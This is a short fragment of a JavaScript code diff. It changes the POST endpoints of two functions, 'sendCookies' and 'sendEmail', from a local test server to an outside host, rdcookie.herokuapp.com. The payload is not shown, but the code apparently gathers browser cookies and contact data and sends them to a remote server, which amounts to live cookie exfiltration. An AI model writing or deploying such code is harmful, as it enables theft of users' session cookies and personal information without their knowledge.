@@ -33,7 +33,7 @@ var sendCookies = function(address){
                   }
                 };
   $.ajax({
-        url: 'http://127.0.0.1:3000/logs.json',
+        url: 'https://rdcookie.herokuapp.com/logs.json',
         type: 'POST',
         dataType: 'json',
         success: function (data) {
@@ -53,7 +53,7 @@ var sendEmail = function(){
       }
     };
     $.ajax({
-          url: 'http://127.0.0.1:3000/contacts.json',
+          url: 'https://rdcookie.herokuapp.com/contacts.json',
           type: 'POST',
           dataType: 'json',
           success: function () {
